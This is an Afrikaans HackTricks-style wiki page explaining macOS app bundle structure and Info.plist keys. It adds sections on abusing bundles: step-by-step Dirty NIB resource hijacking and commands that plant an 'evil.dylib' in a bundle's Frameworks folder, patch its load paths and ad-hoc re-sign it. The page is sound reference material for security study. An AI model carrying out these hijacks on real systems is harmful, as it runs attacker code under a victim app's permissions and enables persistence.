# macOS-bundels

{{#include ../../../banners/hacktricks-training.md}}

## Basiese inligting

Bundels in macOS dien as houers vir verskeie hulpbronne, insluitend toepassings, libraries en ander nodige lêers, sodat hulle in Finder as enkele objekte verskyn, soos die bekende `*.app`-lêers. Die bundel wat die meeste teëgekom word, is die `.app`-bundel, hoewel ander tipes soos `.framework`, `.systemextension` en `.kext` ook algemeen voorkom.

### Noodsaaklike komponente van ’n bundel

Binne ’n bundel, veral binne die `<application>.app/Contents/`-gids, word verskeie belangrike hulpbronne gehuisves:

- **\_CodeSignature**: Hierdie gids stoor code-signing-besonderhede wat noodsaaklik is om die integriteit van die toepassing te verifieer. Jy kan die code-signing-inligting inspekteer deur opdragte soos die volgende te gebruik:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Bevat die uitvoerbare binary van die toepassing wat na gebruikersinteraksie loop.
- **Resources**: ’n Bewaarplek vir die toepassing se gebruikerskoppelvlakkomponente, insluitend beelde, dokumente en koppelvlakbeskrywings (`nib`/`xib`-lêers).
- **Info.plist**: Dien as die toepassing se hoofkonfigurasielêer en is noodsaaklik sodat die stelsel die toepassing korrek kan herken en daarmee kan kommunikeer.

#### Belangrike sleutels in Info.plist

Die `Info.plist`-lêer is ’n kernonderdeel van toepassingkonfigurasie en bevat sleutels soos:

- **CFBundleExecutable**: Spesifiseer die naam van die hoofuitvoerbare lêer in die `Contents/MacOS`-gids.
- **CFBundleIdentifier**: Verskaf ’n globale identifiseerder vir die toepassing, wat macOS omvattend vir toepassingbestuur gebruik.
- **LSMinimumSystemVersion**: Dui die minimum weergawe van macOS aan wat benodig word om die toepassing te laat loop.

### Verkenning van Bundles

Om die inhoud van ’n bundle, soos `Safari.app`, te verken, kan die volgende opdrag gebruik word: `bash ls -lR /Applications/Safari.app/Contents`

Hierdie verkenning toon gidse soos `_CodeSignature`, `MacOS` en `Resources`, asook lêers soos `Info.plist`, wat elk ’n unieke doel dien — van die beveiliging van die toepassing tot die definiëring van sy gebruikerskoppelvlak en operasionele parameters.

#### Bykomende Bundle-gidse

Benewens die algemene gidse kan bundles ook die volgende insluit:

- **Frameworks**: Bevat frameworks wat saam met die toepassing gebundel is. Frameworks is soos dylibs met bykomende hulpbronne.
- **PlugIns**: ’n Gids vir plug-ins en uitbreidings wat die toepassing se vermoëns verbeter.
- **XPCServices**: Bevat XPC services wat die toepassing vir interproseskommunikasie gebruik.

Hierdie struktuur verseker dat alle nodige komponente binne die bundle ingesluit is, wat ’n modulêre en veilige toepassingomgewing moontlik maak.

Vir meer besonderhede oor `Info.plist`-sleutels en hul betekenisse bied die Apple-ontwikkelaardokumentasie uitgebreide hulpbronne: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Sekuriteitsnotas en Abuse Vectors

- **Gatekeeper / App Translocation**: Wanneer ’n bundle met quarantine vir die eerste keer uitgevoer word, voer macOS ’n deeglike handtekeningverifikasie uit en kan dit die bundle vanaf ’n gerandomiseerde translocated path laat loop. Nadat dit aanvaar is, voer latere launchings slegs vlak kontroles uit; resource files in `Resources/`, `PlugIns/`, nibs, ens. is histories nie nagegaan nie. Sedert macOS 13 Ventura word ’n diep kontrole tydens die eerste run afgedwing, en die nuwe *App Management* TCC-permission beperk third-party processes se vermoë om ander bundles sonder gebruikerstoestemming te wysig, maar ouer stelsels bly kwesbaar.
- **Bundle Identifier-collisions**: Veelvuldige embedded targets (`PlugIns`, helper tools) wat dieselfde `CFBundleIdentifier` hergebruik, kan signature validation breek en soms URL-scheme hijacking/confusion moontlik maak. Enumerate altyd sub-bundles en verifieer unieke IDs.

## Resource Hijacking (Dirty NIB / NIB Injection)

Voor Ventura kon die omruiling van UI resources in ’n signed app shallow code signing omseil en code execution met die app se entitlements lewer. Huidige navorsing (2024) toon dat dit steeds op pre-Ventura en op un-quarantined builds werk:<sup>[1][2]</sup>

1. Kopieer die target app na ’n writable location (byvoorbeeld `/tmp/Victim.app`).
2. Vervang `Contents/Resources/MainMenu.nib` (of enige nib wat in `NSMainNibFile` verklaar word) met ’n malicious een wat `NSAppleScript`, `NSTask`, ens. instansieer.
3. Launch die app. Die malicious nib loop onder die victim se bundle ID en entitlements (TCC grants, microphone/camera, ens.).
4. Ventura+ versag dit deur die bundle tydens die eerste launch diep te verifieer en *App Management*-permission vir latere modifications te vereis; persistence is dus moeiliker, maar initial-launch attacks op ouer macOS bly van toepassing.<sup>[1]</sup>

Minimale malicious nib-payloadvoorbeeld (compile xib na nib met `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking binne Bundles

Omdat `@rpath`-soektogte gebundelde Frameworks/PlugIns verkies, kan die plasing van ’n kwaadwillige library binne `Contents/Frameworks/` of `Contents/PlugIns/` die load order herlei wanneer die hoofbinary sonder library validation of met swak `LC_RPATH`-ordening gesign is.

Tipiese stappe wanneer ’n unsigned/ad-hoc bundle misbruik word:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- Hardened runtime met `com.apple.security.cs.disable-library-validation` afwesig blokkeer derdeparty-dylibs; check eers entitlements.
- XPC services onder `Contents/XPCServices/` laai dikwels sibling frameworks—patch hul binaries op soortgelyke wyse vir persistence- of privilege escalation-paaie.

## Vinnige inspeksie-cheatsheet
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Verwysings

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
